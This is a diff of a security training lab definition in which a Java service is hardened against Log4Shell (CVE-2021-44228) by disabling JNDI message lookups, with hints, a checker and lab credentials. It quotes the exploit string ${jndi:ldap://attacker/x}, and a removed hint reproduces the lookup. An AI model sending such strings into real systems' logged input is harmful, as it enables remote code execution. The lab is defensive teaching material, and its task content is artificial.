@@ -1,8 +1,7 @@
----
 slug: security-java-log4shell-jndi-lookup
-title: "Log4Shell (CVE-2021-44228) — Disable JNDI Message Lookups"
-technology: Security
-category: "Application Security"
+title: Log4Shell (CVE-2021-44228) — Disable JNDI Message Lookups
+technology: security
+category: Harden
 difficulty: hard
 time_limit: 1200
 max_score: 100
@@ -11,22 +10,109 @@ simulation_type: generic
 infrastructure_type: simulation
 jira_priority: Critical
 is_free: false
-description: |
-  A Java service bundles a vulnerable Log4j2 version and JNDI message lookups are enabled, so an attacker who gets a string like ${jndi:ldap://attacker/x} into any logged field can achieve remote code execution (Log4Shell). The lookup substitution must be turned off and the runtime hardened so logged user input can no longer trigger a JNDI fetch.
+description: 'CONTEXT: A team operating security hardening needs you to resolve `Log4Shell (CVE-2021-44228)
+  — Disable JNDI Message Lookups` during a realistic incident. The business impact is reduced service
+  reliability until the underlying state is repaired.
+
+
+  ENVIRONMENT: You are working in FixitLab''s offline hardening lab with SSH, firewall, TLS, audit logs,
+  and IAM settings. All tools run locally; no paid APIs or external cloud calls are required.
+
+
+  SYMPTOM / STARTING STATE: A Spring Boot app logs request headers with a vulnerable Log4j2. /app/src/main/resources/log4j2.component.properties
+  does not disable message lookups, so ${jndi:ldap://...} in a header is interpreted. A Java service bundles
+  a vulnerable Log4j2 version and JNDI message lookups are enabled, so an attacker who gets a string like
+  ${jndi:ldap://attacker/x} into any logged field can achieve remote code execution (Log4Shell). The lookup
+  substitution must be turned off and the runtime hardened so logged user input can no longer trigger
+  a JNDI fetch.
+
+
+  OBJECTIVE: Confirm Log4j2 JNDI message lookups are enabled (vulnerable); Disable lookup substitution
+  via log4j2.formatMsgNoLookups=true; Ensure the hardening is loaded by the runtime (component properties
+  on the classpath). Success means `check.sh` exits successfully.
+
+
+  WHAT TO AVOID: Do not apply broad destructive changes, skip evidence gathering, or fake completion with
+  marker files — the checker validates real system state.'
 objectives:
-  - "Confirm Log4j2 JNDI message lookups are enabled (vulnerable)"
-  - "Disable lookup substitution via log4j2.formatMsgNoLookups=true"
-  - "Ensure the hardening is loaded by the runtime (component properties on the classpath)"
-  - "Verify a ${jndi:...} payload in a log message no longer triggers a lookup"
-initial_state: |
-  A Spring Boot app logs request headers with a vulnerable Log4j2. /app/src/main/resources/log4j2.component.properties does not disable message lookups, so ${jndi:ldap://...} in a header is interpreted.
+- Confirm Log4j2 JNDI message lookups are enabled (vulnerable)
+- Disable lookup substitution via log4j2.formatMsgNoLookups=true
+- Ensure the hardening is loaded by the runtime (component properties on the classpath)
+- Verify a ${jndi:...} payload in a log message no longer triggers a lookup
+initial_state: 'A Spring Boot app logs request headers with a vulnerable Log4j2. /app/src/main/resources/log4j2.component.properties
+  does not disable message lookups, so ${jndi:ldap://...} in a header is interpreted.
+
+  '
 hints:
-  - order: 1
-    cost: 10
-    content: "Reproduce: log a header containing ${jndi:ldap://test/a} and watch Log4j attempt the lookup."
-  - order: 2
-    cost: 15
-    content: "Set log4j2.formatMsgNoLookups=true (or -Dlog4j2.formatMsgNoLookups=true) to stop substitution."
-  - order: 3
-    cost: 20
-    content: "Best fix is upgrading Log4j2 to a patched release; also remove the JndiLookup class and re-test."
+- order: 1
+  cost: 0
+  content: 'Where to look: Confirm Log4j2 JNDI message lookups are enabled (vulnerable)'
+- order: 2
+  cost: 25
+  content: 'Diagnostic steps:
+
+    1. Disable lookup substitution via log4j2.formatMsgNoLookups=true
+
+    2. Ensure the hardening is loaded by the runtime (component properties on the classpath)
+
+    3. Verify a ${jndi:...} payload in a log message no longer triggers a lookup'
+- order: 3
+  cost: 50
+  content: 'Exact fix + verification:
+
+    1. Verify a ${jndi:...} payload in a log message no longer triggers a lookup.
+
+    2. Re-run the lab checker (`check.sh` or Check Solution).
+
+    3. Confirm every scenario objective is satisfied.
+
+
+    WHY: the grader validates real state — marker files are ignored.'
+summary: Complete the log4shell (cve-2021-44228) — disable jndi message lookups security lab and verify
+  success with the checker
+estimated_minutes: 20
+xp_reward: 100
+prerequisites:
+- Basic security literacy
+tags:
+- fix
+- hands-on
+- security
+linked_tutorial: security-fundamentals
+what_you_will_learn:
+- Confirm Log4j2 JNDI message lookups are enabled (vulnerable)
+- Disable lookup substitution via log4j2.formatMsgNoLookups=true
+- Ensure the hardening is loaded by the runtime (component properties on the classpath)
+- Verify a ${jndi:...} payload in a log message no longer triggers a lookup
+environment:
+  nodes:
+  - role: primary
+    os: FixitLab hardening lab
+    hostname: lab-primary
+    ip: 127.0.0.1
+    specs: local offline simulation
+  pre_installed:
+  - bash
+  - coreutils
+  - journalctl
+  - security
+  - systemctl
+  credentials:
+  - user: root
+    password: lab123
+tasks:
+- id: task_1
+  title: Log4Shell (CVE-2021-44228) — Disable JNDI Message Lookups
+  description: Restore healthy behavior for Log4Shell (CVE-2021-44228) — Disable JNDI Message Lookups
+    by investigating the failure, applying the smallest safe fix, and validating the outcome.
+  background: 'This security lab teaches systematic troubleshooting: observe, hypothesize, change, verify.'
+  validation:
+    type: custom_script
+    script: check.sh
+    error_message: Validation did not pass. Re-read the objectives and Hint 2 diagnostic steps.
+solution:
+  summary: Identify the misconfiguration affecting this security lab and apply the minimal fix.
+  files_changed: []
+  commands_run:
+  - bash check.sh
+  reference_docs: security-fundamentals
